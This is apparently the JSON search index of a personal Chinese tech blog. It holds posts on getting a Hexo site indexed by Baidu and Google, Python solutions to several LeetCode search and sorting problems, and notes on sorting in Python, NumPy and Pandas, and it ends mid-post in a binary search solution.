{"meta":{"title":"fishni","subtitle":"","description":"","author":"John Doe","url":"https://fishni.github.io","root":"/"},"pages":[{"title":"关于","date":"2020-04-06T10:04:14.332Z","updated":"2020-04-06T10:04:14.332Z","comments":true,"path":"about/index.html","permalink":"https://fishni.github.io/about/index.html","excerpt":"","text":"I’m fishmouse! 本博文是自身学习的一种记录，予己，希望能予以！"},{"title":"所有分类","date":"2020-03-30T05:12:13.734Z","updated":"2020-03-30T05:12:13.734Z","comments":true,"path":"categories/index.html","permalink":"https://fishni.github.io/categories/index.html","excerpt":"","text":""},{"title":"所有标签","date":"2020-03-30T05:13:30.921Z","updated":"2020-03-30T05:13:30.921Z","comments":true,"path":"tags/index.html","permalink":"https://fishni.github.io/tags/index.html","excerpt":"","text":""},{"title":"友邻","date":"2020-07-11T06:52:13.712Z","updated":"2020-07-11T06:52:13.712Z","comments":true,"path":"friends/index.html","permalink":"https://fishni.github.io/friends/index.html","excerpt":"这里写友链上方的内容。","text":"这里写友链上方的内容。"}],"posts":[{"title":"【hexo】Hexo博客收录百度和谷歌","slug":"Hexo-01-Hexo博客收录百度和谷歌","date":"2021-03-14T16:00:00.000Z","updated":"2021-03-15T09:15:19.792Z","comments":true,"path":"2021/03/15/Hexo-01-Hexo博客收录百度和谷歌/","link":"","permalink":"https://fishni.github.io/2021/03/15/Hexo-01-Hexo%E5%8D%9A%E5%AE%A2%E6%94%B6%E5%BD%95%E7%99%BE%E5%BA%A6%E5%92%8C%E8%B0%B7%E6%AD%8C/","excerpt":"本文博客搭建：hexo+github方式","text":"本文博客搭建：hexo+github方式 确定网站是否已经被收录site:你的网站 同样可测试是否被google收录 安装扩展插件站点地图是一种文件，您可以通过该文件列出您网站上的网页，从而将您网站内容的组织架构告知Google和其他搜索引擎。Googlebot等搜索引擎网页抓取工具会读取此文件，以便更加智能地抓取您的网站。 在你的hexo博客根目录，用下面2个命令分别安装谷歌、百度所对应的站点地图生成文件 npm install hexo-generator-sitemap –save npm install hexo-generator-baidu-sitemap –save 若出现下列错误， 直接删除该文件即可 在博客目录的_config.yml中添加如下代码 # 自动生成sitemap # sitemap sitemap: path: sitemap.xml baidusitemap: path: baidusitemap.xml 编译博客 hexo g 然后你可以看到在你博客下的public目录下生成了sitemap.xml以及baidusitemap.xml文件，这样就大功告成了。sitemap.xml是提交给谷歌的、baidusitemap.xml是提交给百度的。 部署后你分别访问 https://fishni.github.io/sitemap.xml https://fishni.github.io/baidusitemap.xml出现相关内容即证明成功 验证网站所有权google搜索引擎站点入口 百度搜索引擎站点入口 为什么要验证网站 站长平台推荐站长添加主站（您网站的链接也许会使用www 和非 www 两种网址，建议添加用户能够真实访问到的网址），添加并验证后，可证明您是该域名的拥有者，可以快捷批量添加子站点，查看所有子站数据，无需再一一验证您的子站点。 如何验证网站 首先如果您的网站已使用了百度统计，您可以使用统计账号登录平台，或者绑定站长平台与百度统计账号，站长平台支持您批量导入百度统计中的站点，您不需要再对网站进行验证。 百度站长平台为未使用百度统计的站点提供三种验证方式：文件验证、html标签验证、CNAME验证。 1.文件验证：您需要下载验证文件，将文件上传至您的服务器，放置于域名根目录下。 2.html标签验证：将html标签添加至网站首页html代码的标签与 标签之间。 3.CNAME验证：您需要登录域名提供商或托管服务提供商的网站，添加新的DNS记录。 验证完成后，我们将会认为您是网站的拥有者。为使您的网站一直保持验证通过的状态，请保留验证的文件、html标签或CNAME记录，我们会去定期检查验证记录。 参考链接：https://www.jianshu.com/p/5e68f78c7791来源：简书百度登录百度资源搜索平台用户中心 &gt; 站点管理，点击添加站点 站点领域随便填一下就好，然后选择文件验证验证你的网站 推荐文件验证，根据提示下载验证文件，将它拷贝到hexo/themes/next/source文件夹下 然后更新部署网站，在你的博客域名+/验证文件名看看你不能访问，例如我输入的是这个： https://fishni.github.io/baidu_verify_code-eX5Up440HK.html 验证后结果显示 多次尝试后进入下图页面 等一段时间后，验证成功 推送设置 首先，安装hexo-baidu-url-submit插件 npm install hexo-baidu-url-submit –save 在站点配置文件中添加baidu-url-submit的配置项，把以下内容配置到站点配置文件_config.yml中。 #设置百度主动推送 baidu_url_submit: count: 1 #比如1，代表提交最新的1个链接 host: fishni.github.io/# 在百度站长平台中注册的域名，这个改为你自己的域名 token: your_token # 请注意这是您的秘钥， 所以请不要把博客源代码发布在公众仓库里! path: baidu_urls.txt # 文本文档的地址， 新链接会保存在此文本文档里，这个默认这个秘钥可以从百度站长平台的普通收录那里获取到，如下图所示： 在站点配置文件中加入新的deploy配置项 同样在站点配置文件中找到deploy项，添加新的推送项，如下所示： # Deployment deploy: - type: git repository: github: git@github.com:TRHX/TRHX.github.io.git # 这是原来的 github 配置 coding: git@git.dev.tencent.com:TRHX/TRHX.git # 这是原来的 coding 配置 branch: master - type: baidu_url_submitter # 这是新加的主动推送这里一直报错，网上搜了相关内容，全是成功的例子，我就不继续弄了 google谷歌操作比较简单，就是向Google站长工具提交sitemap 登录Google账号，添加了站点验证通过后，选择添加网址前缀：https://fishni.github.io 完成验证后，选择站点，之后在索引——站点地图中就能看到添加/测试站点地图，如下图： 如图出现一些问题,这可能需要等待一段时间 通过site:fishni.github.io，验证是否被收录 经过一段时间，sitemap.xml","categories":[{"name":"其他","slug":"其他","permalink":"https://fishni.github.io/categories/%E5%85%B6%E4%BB%96/"}],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://fishni.github.io/tags/hexo/"}]},{"title":"【数据结构与算法】【LeetCode】【dfs+回溯】46.全排列","slug":"LeetCode-H-搜索算法-46. 全排列","date":"2021-03-11T16:00:00.000Z","updated":"2021-03-12T06:40:39.435Z","comments":true,"path":"2021/03/12/LeetCode-H-搜索算法-46. 全排列/","link":"","permalink":"https://fishni.github.io/2021/03/12/LeetCode-H-%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95-46.%20%E5%85%A8%E6%8E%92%E5%88%97/","excerpt":"深度优先搜索、回溯思想","text":"深度优先搜索、回溯思想 题目给定一个 没有重复数字的序列，返回其所有可能的全排列。 示例： 输入: [1,2,3] 输出: [ [1,2,3], [1,3,2], [2,1,3], [2,3,1], [3,1,2], [3,2,1] ]题解123456789101112131415161718192021class Solution: def permute(self, nums):# nums: list[int] ,返回值：list[list[int]] # 定义路径列表，track if len(nums)==0: return [] track=[] res=[] self.backtrack(nums,track,res) return res def backtrack(self,nums,track,res): # 回溯实现 # 如果track长度等于nums长度，即一种选择，放入res中 if len(track)==len(nums): res.append(track[:]) # 变量track列表指向是地址，深度优先遍历完成以后，回到了根结点，成为空列表。所以这里做一个拷贝 return for i in range(len(nums)): if nums[i] in track: continue track.append(nums[i]) self.backtrack(nums,track,res) track.pop() 1234if __name__=='__main__': nums=[1,2,3] a = Solution() print(a.permute(nums)) [[1, 2, 3], [1, 3, 2], [2, 1, 3], [2, 3, 1], [3, 1, 2], [3, 2, 1]]","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"dfs、回溯","slug":"dfs、回溯","permalink":"https://fishni.github.io/tags/dfs%E3%80%81%E5%9B%9E%E6%BA%AF/"}]},{"title":"【数据结构与算法】【LeetCode】【搜索】695.岛屿的最大面积","slug":"LeetCode-H-搜索算法-695. 岛屿的最大面积","date":"2021-03-09T16:00:00.000Z","updated":"2021-03-10T06:51:22.581Z","comments":true,"path":"2021/03/10/LeetCode-H-搜索算法-695. 岛屿的最大面积/","link":"","permalink":"https://fishni.github.io/2021/03/10/LeetCode-H-%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95-695.%20%E5%B2%9B%E5%B1%BF%E7%9A%84%E6%9C%80%E5%A4%A7%E9%9D%A2%E7%A7%AF/","excerpt":"深度优先搜索、栈","text":"深度优先搜索、栈 题目给定一个包含了一些 0 和 1 的非空二维数组 grid 。 一个 岛屿 是由一些相邻的 1 (代表土地) 构成的组合，这里的「相邻」要求两个 1 必须在水平或者竖直方向上相邻。你可以假设 grid 的四个边缘都被 0（代表水）包围着。 找到给定的二维数组中最大的岛屿面积。(如果没有岛屿，则返回面积为 0） 示例： Input: [[1,0,1,1,0,1,0,1], [1,0,1,1,0,1,1,1], [0,0,0,0,0,0,0,1]] Output: 6 最大的岛屿面积为 6，位于最右侧。题解方法一：深度优先搜索 确定一块土地时，从四个方向考虑，为了避免每块土地多次计算，每次访问后将其赋值为0 12345678910111213141516class Solution: def maxAreaOfIsland(self,grid):# grid :List[list[int]] maxArea=0 for i,l in enumerate(grid): for j,n in enumerate(l): maxArea=max(self.dfs(grid,i,j),maxArea) return maxArea def dfs(self,grid,cur_i,cur_j): if cur_i&lt;0 or cur_j&lt;0 or cur_i==len(grid) or cur_j==len(grid[0]) or grid[cur_i][cur_j]!=1: return 0 grid[cur_i][cur_j]=0 ans=1 for di,dj in [[0,1],[0,-1],[1,0],[-1,0]]: next_i,next_j = cur_i+di,cur_j+dj ans +=self.dfs(grid,next_i,next_j) return ans 12345grid=[[1,0,1,1,0,1,0,1],[1,0,1,1,0,1,1,1],[0,0,0,0,0,0,0,1]]a = Solution()a.maxAreaOfIsland(grid) 6复杂度分析时间复杂度：O(R×C)。其中 R 是给定网格中的行数，C是列数。我们访问每个网格最多一次。 空间复杂度：O(R×C)。递归的深度最大可能是整个网格的大小，因此最大可能使用 O(R×C) 的栈空间。 方法二：深度优先搜索 + 栈这种方法本质与方法一相同，唯一的区别是 方法一通过函数的调用来表示接下来想要遍历哪些土地，让下一层函数来访问这些土地。而方法二把接下来想要遍历的土地放在栈里，然后在取出这些土地的时候访问它们。 访问每一片土地时，我们将对围绕它四个方向进行探索，找到还未访问的土地，加入到栈 stack 中； 另外，只要栈 stack 不为空，就说明我们还有土地待访问，那么就从栈中取出一个元素并访问。 123456789101112131415161718class Solution: def maxAreaOfIsland(self,grid):# grid:List[List[int]] maxArea=0 for i in range(len(grid)): for j in range(len(grid[0])): curArea=0 stack = [(i,j)] while stack: cur_i,cur_j=stack.pop() if cur_i&lt;0 or cur_j&lt;0 or cur_i==len(grid) or cur_j==len(grid[0]) or grid[cur_i][cur_j]!=1: continue curArea+=1 grid[cur_i][cur_j]=0 for di,dj in [[1,0],[-1,0],[0,1],[0,-1]]: next_i,next_j=cur_i+di,cur_j+dj stack.append((next_i,next_j)) maxArea=max(curArea,maxArea) return maxArea 12345grid=[[1,0,1,1,0,1,0,1],[1,0,1,1,0,1,1,1],[0,0,0,0,0,0,0,1]]a = Solution()a.maxAreaOfIsland(grid) 6","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"搜索","slug":"搜索","permalink":"https://fishni.github.io/tags/%E6%90%9C%E7%B4%A2/"}]},{"title":"【数据结构与算法】【LeetCode】【排序】347.前K个高频元素","slug":"LeetCode-G-排序-347. 前 K 个高频元素","date":"2021-03-04T16:00:00.000Z","updated":"2021-03-05T02:00:23.748Z","comments":true,"path":"2021/03/05/LeetCode-G-排序-347. 前 K 个高频元素/","link":"","permalink":"https://fishni.github.io/2021/03/05/LeetCode-G-%E6%8E%92%E5%BA%8F-347.%20%E5%89%8D%20K%20%E4%B8%AA%E9%AB%98%E9%A2%91%E5%85%83%E7%B4%A0/","excerpt":"桶排序","text":"桶排序 题目给定一个非空的整数数组，返回其中出现频率前 k 高的元素。 示例1： 输入: nums = [1,1,1,2,2,3], k = 2 输出: [1,2]示例2： 输入: nums = [1], k = 1 输出: [1]提示： 你可以假设给定的 k 总是合理的，且 1 ≤ k ≤ 数组中不相同的元素的个数。 你的算法的时间复杂度必须优于 O(n log n) , n 是数组的大小。 题目数据保证答案唯一，换句话说，数组中前 k 个高频元素的集合是唯一的。 你可以按任意顺序返回答案。题解桶排序思路： 统计各数出现的频次 以频次为索引建立对应的数的集合 1234567891011121314class Solution: def topKFrequent(self, nums, k):# nums:List[int],k:int dic =dict() for i in nums: if i in dic.keys(): dic[i] +=1 else: dic[i]=1 new_list= sorted(dic.items(),key=lambda x:x[1]) tmp=[] for i in new_list[-k:]: tmp.append(i[0]) return tmp 1234a = Solution()nums = [1,1,1,2,2,3]k = 2a.topKFrequent(nums,k) [2, 1]","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"排序","slug":"排序","permalink":"https://fishni.github.io/tags/%E6%8E%92%E5%BA%8F/"}]},{"title":"【数据结构与算法】【LeetCode】【排序】215.数组中的第K个最大的元素","slug":"LeetCode-G-排序-215. 数组中的第K个最大元素","date":"2021-03-03T16:00:00.000Z","updated":"2021-03-04T07:10:21.581Z","comments":true,"path":"2021/03/04/LeetCode-G-排序-215. 数组中的第K个最大元素/","link":"","permalink":"https://fishni.github.io/2021/03/04/LeetCode-G-%E6%8E%92%E5%BA%8F-215.%20%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E7%AC%ACK%E4%B8%AA%E6%9C%80%E5%A4%A7%E5%85%83%E7%B4%A0/","excerpt":"快速选择","text":"快速选择 题目在未排序的数组中找到第 k 个最大的元素。请注意，你需要找的是数组排序后的第 k 个最大的元素，而不是第 k 个不同的元素。 示例1： 输入: [3,2,1,5,6,4] 和 k = 2 输出: 5示例2： 输入: [3,2,3,1,2,4,5,5,6] 和 k = 4 输出: 4题解方法一：暴力解法思路：进行完整的排序，再从右至左输出第n-k个元素 进行快速排序后 - 时间复杂度：O(nlogn) - 空间复杂度：O(1) 1234567891011121314151617181920class Solution: def findKthLargest(self, nums, k) -&gt; int: self.quick_sort(nums,0,len(nums)) return nums[len(nums)-k] def quick_sort(self,nums,lo,hi): if lo+1&gt;=hi: return first =lo last =hi-1 pivot=nums[first] while first&lt;last: while first&lt;last and nums[last]&gt;=pivot: last = last-1 nums[first]=nums[last] while first&lt;last and nums[first]&lt;=pivot: first=first+1 nums[last] = nums[first] nums[first]=pivot self.quick_sort(nums,lo,first) self.quick_sort(nums,first+1,hi) 1234a = Solution()nums=[3,2,3,1,2,4,5,5,6]k = 2a.findKthLargest(nums,k) 5方法二：快速选择思路：利用快速排序，每次都能将一个元素放在其既定位置，即每趟：nums[lo:p-1]&lt;nums[p]&lt;nums[p+1:hi]，如此每趟能得出一个p，若p&lt;target=len(nums)-k则说明第k个大的元素在（p和hi之间），反之在（lo和p之间） 考虑快排对已经有序的排序复杂度高问题，每次选pivot时，随机选 1234567891011121314151617181920212223242526272829import randomclass Solution: def findKthLargest(self, nums, k) -&gt; int: target = len(nums)-k lo = 0 hi = len(nums)-1 while lo&lt;=hi: p = self.partion(nums,lo,hi) if p&lt;target: lo=p+1 elif p&gt;target: hi =p-1 else: return nums[p] def partion(self,nums,lo,hi): if lo&lt;hi: # 随机选取pivot rindex= random.randint(lo,hi) nums[lo],nums[rindex]=nums[rindex],nums[lo] pivot = nums[lo] while lo&lt;hi: while lo&lt;hi and nums[hi]&gt;=pivot: hi=hi-1 nums[lo]=nums[hi] while lo&lt;hi and nums[lo]&lt;=pivot: lo = lo+1 nums[hi]=nums[lo] nums[lo]=pivot return lo 1234a = Solution()nums=[3,2,3,1,2,4,5,5,6]k = 2a.findKthLargest(nums,k) 5算法导论中提到的快速排序，一趟就分完 1234567891011121314151617181920212223242526import randomclass Solution: def findKthLargest(self, nums, k) -&gt; int: target = len(nums)-k lo = 0 hi = len(nums)-1 while lo&lt;=hi: p = self.partion(nums,lo,hi) if p&lt;target: lo=p+1 elif p&gt;target: hi =p-1 else: return nums[p] def partion(self,nums,lo,hi): random_index = random.randint(lo,hi) nums[random_index],nums[lo]=nums[lo],nums[random_index] pivot = nums[lo] j=lo for i in range(lo+1,hi+1): if nums[i]&lt;pivot: j+= 1 nums[i],nums[j]=nums[j],nums[i] nums[lo],nums[j]=nums[j],nums[lo] return j 1234a = Solution()nums=[3,2,3,1,2,4,5,5,5,6,6]k = 2a.findKthLargest(nums,k) 6","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"排序","slug":"排序","permalink":"https://fishni.github.io/tags/%E6%8E%92%E5%BA%8F/"}]},{"title":"【python-基础】python中排序方法","slug":"Python-A-排序-Python中排序方法小结","date":"2021-03-02T16:00:00.000Z","updated":"2021-03-03T06:37:21.497Z","comments":true,"path":"2021/03/03/Python-A-排序-Python中排序方法小结/","link":"","permalink":"https://fishni.github.io/2021/03/03/Python-A-%E6%8E%92%E5%BA%8F-Python%E4%B8%AD%E6%8E%92%E5%BA%8F%E6%96%B9%E6%B3%95%E5%B0%8F%E7%BB%93/","excerpt":"python中排序简单小结","text":"python中排序简单小结 Python中内置的排序方法 Python列表中list.sort()方法可直接修改原列表对象排序 sorted()函数对可迭代对象排序并返回新的列表对象 直接用简单函数进行简单的排序123a = [5,3,2,1]b = sorted(a)print(a,\"\\n\",b) [5, 3, 2, 1] [1, 2, 3, 5]123a= [4,3,2]a.sort()a [2, 3, 4]关键函数排序list.sort()和sorted()函数都有一个key参数，key形参的值应是函数，他接受一个参数并返回一个用于排序的键 函数中参数reverse控制升序降序，默认reverse=False,即升序 1sorted([3,1,4,5]) # 升序 [1, 3, 4, 5]1sorted([3,1,4,5],reverse=True) # 降序 [5, 4, 3, 1]str.lower按照小写进行排序，忽略大小写 1sorted(\"This is a test string from Andrew\".split(), key=str.lower)# [&apos;a&apos;, &apos;Andrew&apos;, &apos;from&apos;, &apos;is&apos;, &apos;string&apos;, &apos;test&apos;, &apos;This&apos;]常使用对象的一些索引作为键对复杂对象进行排序 12student_tuples = [('john', 'A', 15),('jane', 'B', 12),('dave', 'B', 10)]sorted(student_tuples,key=lambda student:student[2])#按照student的年龄排序 [(&apos;dave&apos;, &apos;B&apos;, 10), (&apos;jane&apos;, &apos;B&apos;, 12), (&apos;john&apos;, &apos;A&apos;, 15)]同样的方法也可以用于命名属性的对象 1234567class Student: def __init__(self, name, grade, age): self.name = name self.grade = grade self.age = age def __repr__(self): return repr((self.name, self.grade, self.age)) 12345student_objects = [ Student('john', 'A', 15), Student('jane', 'B', 12), Student('dave', 'B', 10),] 1sorted(student_objects, key=lambda student: student.age) # sort by age [(&apos;dave&apos;, &apos;B&apos;, 10), (&apos;jane&apos;, &apos;B&apos;, 12), (&apos;john&apos;, &apos;A&apos;, 15)]Operator函数块可以利用Operator的访问器功能更容易、快捷，将operator模块的itemgetter()、attrgetter()、methodcaller()函数作为sorted()的键函数。 1from operator import itemgetter, attrgetter 1sorted(student_tuples,key=itemgetter(2)) [(&apos;dave&apos;, &apos;B&apos;, 10), (&apos;jane&apos;, &apos;B&apos;, 12), (&apos;john&apos;, &apos;A&apos;, 15)]1sorted(student_objects, key=attrgetter('age')) [(&apos;dave&apos;, &apos;B&apos;, 10), (&apos;jane&apos;, &apos;B&apos;, 12), (&apos;john&apos;, &apos;A&apos;, 15)]可以对多个关键字进行排序 1sorted(student_tuples, key=itemgetter(1,2)) [(&apos;john&apos;, &apos;A&apos;, 15), (&apos;dave&apos;, &apos;B&apos;, 10), (&apos;jane&apos;, &apos;B&apos;, 12)]Numpy中数组排序直接排序和python内建的列表类型相似，Numpy数组可以使用sort方法按位置排序,np.sort方法返回的是已经排好序的数组拷贝，而不是对原数组的原位置排序 1import numpy as np 12arr= np.random.randn(3)arr array([-1.35092935, -0.58342412, -0.8207302 ])12arr.sort()arr array([-1.35092935, -0.8207302 , -0.58342412])123# 对二维数组 排序，按轴排序arr1 = np.random.randn(5,3)arr1 array([[ 1.80974897, -0.31702384, 0.39830353], [-0.96726721, 0.38100404, 0.31633181], [ 0.47419492, -0.44129861, 0.47946414], [ 1.12581458, 0.43486315, -1.99929904], [ 1.19119537, 1.24635077, -1.26876347]])12arr1.sort(1)arr1 array([[-0.31702384, 0.39830353, 1.80974897], [-0.96726721, 0.31633181, 0.38100404], [-0.44129861, 0.47419492, 0.47946414], [-1.99929904, 0.43486315, 1.12581458], [-1.26876347, 1.19119537, 1.24635077]])间接排序在数据排序中，可能需要通过一个或多个键对数据进行排序，比如给定学生的数据，需要先按班级排序，再成绩排序，这是间接排序。 Numpy中提供了两个方法：argsort() 和 numpy.lexsort(), 可以先获得整数索引数组(索引器)，索引数组的元素是原数组中相应元素的索引，然后将原数组重新排列成索引数组指定的顺序。 argsort()函数是将原始数组中的元素从小到大排列，提取其对应的index(索引 12arr2= np.array([5,0,1,3,2])arr2 array([5, 0, 1, 3, 2])12index = arr2.argsort()index array([1, 2, 4, 3, 0], dtype=int64)1arr2[index] array([0, 1, 2, 3, 5])123# 二维数组arr3= np.random.randn(5,3)arr3 array([[ 0.50369183, -0.14320525, 1.17931436], [-0.46240806, 1.1170554 , -0.17238359], [ 0.59020501, -0.71495542, -0.97350068], [-0.40442428, -1.09054876, -0.71871284], [-2.43518373, 0.90166379, -0.39092172]])12index0 = arr3.argsort(axis =0)# 列方向上排序index0 array([[4, 3, 2], [1, 2, 3], [3, 0, 4], [0, 4, 1], [2, 1, 0]], dtype=int64)12index1 =arr3.argsort(axis = 1)# 行方向上排序index1 array([[1, 0, 2], [0, 2, 1], [2, 1, 0], [1, 2, 0], [0, 2, 1]], dtype=int64)Pandas中的排序在Pandas中有两种排序方式，按索引排序：sort_index()；按值排序：sort_values()。 1234# Seriesimport pandas as pdser = pd.Series(range(5),index=['a','e','d','s','o'])ser a 0 e 1 d 2 s 3 o 4 dtype: int641ser.sort_index() a 0 d 2 e 1 o 4 s 3 dtype: int64123# DataFramedf = pd.DataFrame(np.arange(8).reshape((2,4)),index = ['one','three'],columns = ['d','a','b','c'])df .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } d a b c one 0 1 2 3 three 4 5 6 7 1df.sort_index(axis = 1, ascending = False) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } d c b a one 0 3 2 1 three 4 7 6 5 1df.sort_values(axis = 0, ascending = False, by = ['a','c']) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } d a b c three 4 5 6 7 one 0 1 2 3","categories":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/categories/python/"},{"name":"Python基础","slug":"python/Python基础","permalink":"https://fishni.github.io/categories/python/Python%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"排序","slug":"排序","permalink":"https://fishni.github.io/tags/%E6%8E%92%E5%BA%8F/"}]},{"title":"【数据结构与算法】【LeetCode】【排序】常用排序算法","slug":"LeetCode-G-排序-常用排序算法","date":"2021-03-01T16:00:00.000Z","updated":"2021-03-02T06:54:11.053Z","comments":true,"path":"2021/03/02/LeetCode-G-排序-常用排序算法/","link":"","permalink":"https://fishni.github.io/2021/03/02/LeetCode-G-%E6%8E%92%E5%BA%8F-%E5%B8%B8%E7%94%A8%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/","excerpt":"常用排序算法简单实践。","text":"常用排序算法简单实践。 快速排序思想： 对A进行排序 选择A中的任意一个元素pivot，该元素作为基准 将小于基准的元素移到左边，大于基准的元素移到右边（分区操作） A被pivot分为两部分，继续对剩下的两部分做同样的处理 直到所有子集元素不再需要进行上述步骤 1234567891011121314151617# 采用左闭右闭def quick_sort(nums,lo,hi):#nums:List[int] ,lo:int,hi:int if lo+1&gt;=hi: return first=lo last = hi-1 pivot = nums[first] while first&lt;last: while first&lt;last and nums[last]&gt;=pivot: last=last-1 nums[first]=nums[last] while first&lt;last and nums[first]&lt;=pivot: first=first+1 nums[last]=nums[first] nums[first]=pivot quick_sort(nums,lo,first) quick_sort(nums,first+1,hi) 123nums=[5,4,3,1,6,5]quick_sort(nums,0,len(nums))nums [1, 3, 4, 5, 5, 6]归并排序归并排序采用分而治之的原理： 将一个序列从中间位置分成两个序列； 在将这两个子序列按照第一步继续二分下去； 直到所有子序列的长度都为1，也就是不可以再二分截止。这时候再两两合并成一个有序序列即可。 12345678910111213141516171819202122232425262728293031def merge(a, b): c = [] h = j = 0 while j &lt; len(a) and h &lt; len(b): if a[j] &lt; b[h]: c.append(a[j]) j += 1 else: c.append(b[h]) h += 1 if j == len(a): for i in b[h:]: c.append(i) else: for i in a[j:]: c.append(i) return c def merge_sort(lists): if len(lists) &lt;= 1: return lists middle = len(lists)//2 left = merge_sort(lists[:middle]) right = merge_sort(lists[middle:]) return merge(left, right) if __name__ == '__main__': a = [14, 2, 34, 43, 21, 19] print (merge_sort(a)) [2, 14, 19, 21, 34, 43]插入排序将无序逐个添加至有序中 123456789101112131415161718def insert_sort(arr): \"\"\"插入排序\"\"\" # 第一层for表示循环插入的遍数 for i in range(1, len(arr)): # 设置当前需要插入的元素 current = arr[i] # 与当前元素比较的比较元素 pre_index = i - 1 while pre_index &gt;= 0 and arr[pre_index] &gt; current: # 当比较元素大于当前元素则把比较元素后移 arr[pre_index + 1] = arr[pre_index] # 往前选择下一个比较元素 pre_index -= 1 # 当比较元素小于当前元素，则将当前元素插入在 其后面 arr[pre_index + 1] = current return arrinsert_sort([11, 2,1,4,5,3,9]) [1, 2, 3, 4, 5, 9, 11]冒泡排序思路：依次比较相邻的元素，前者大于后者则交换，每趟将最大值交换至最右 1234567891011121314def bubble_sort(nums):# nums：List[int] n = len(nums) for i in range(1,n): swapped = False for j in range(1,n-i+1): if nums[j]&lt;nums[j-1]: nums[j],nums[j-1]=nums[j-1],nums[j] # 两者值交换 swapped= True if not swapped: breaknums=[2,1,4,3,6,5]bubble_sort(nums)print(nums) [1, 2, 3, 4, 5, 6]选择排序思路：每次选择最小者放置左边 1234567891011def selection_sort(nums): n = len(nums) for i in range(n): pos = i for j in range(i+1,n): if nums[j]&lt;nums[pos]: pos=j nums[pos],nums[i]=nums[i],nums[pos]nums=[3,1,2,5,4,6]selection_sort(nums)nums [1, 2, 3, 4, 5, 6]","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"排序","slug":"排序","permalink":"https://fishni.github.io/tags/%E6%8E%92%E5%BA%8F/"}]},{"title":"【数据结构与算法】【LeetCode】【二分查找】81.搜索旋转排序数据II","slug":"LeetCode-F-二分查找-81. 搜索旋转排序数组 II","date":"2021-02-28T16:00:00.000Z","updated":"2021-03-01T12:42:45.148Z","comments":true,"path":"2021/03/01/LeetCode-F-二分查找-81. 搜索旋转排序数组 II/","link":"","permalink":"https://fishni.github.io/2021/03/01/LeetCode-F-%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE-81.%20%E6%90%9C%E7%B4%A2%E6%97%8B%E8%BD%AC%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84%20II/","excerpt":"二分查找","text":"二分查找 题目假设按照升序排序的数组在预先未知的某个点上进行了旋转。 ( 例如，数组 [0,0,1,2,2,5,6] 可能变为 [2,5,6,0,0,1,2] )。 编写一个函数来判断给定的目标值是否存在于数组中。若存在返回 true，否则返回 false。示例1： 输入: nums = [2,5,6,0,0,1,2], target = 0 输出: true示例2： 输入: nums = [2,5,6,0,0,1,2], target = 3 输出: false题解1234567# 方法一：利用in判读元素是否存在于列表中class Solution: def search(self, nums, target) -&gt; bool: # List[int] ,target:int if target in nums: return True else: return False 123456789101112131415161718192021222324class Solution: def search(self, nums, target): l = 0 r = len(nums) - 1 while l&lt;=r: mid = (l+r) // 2 if nums[mid] == target: return True if nums[mid] == nums[l]: # l和mid重复，l加一 l += 1 elif nums[mid] == nums[r]: # mid和r重复，r减一 r -= 1 elif nums[mid] &gt; nums[l]: # l到mid是有序的，判断target是否在其中 if nums[l] &lt;= target &lt; nums[mid]: # target在其中，选择l到mid这段 r = mid - 1 else: # target不在其中，扔掉l到mid这段 l = mid + 1 elif nums[mid] &lt; 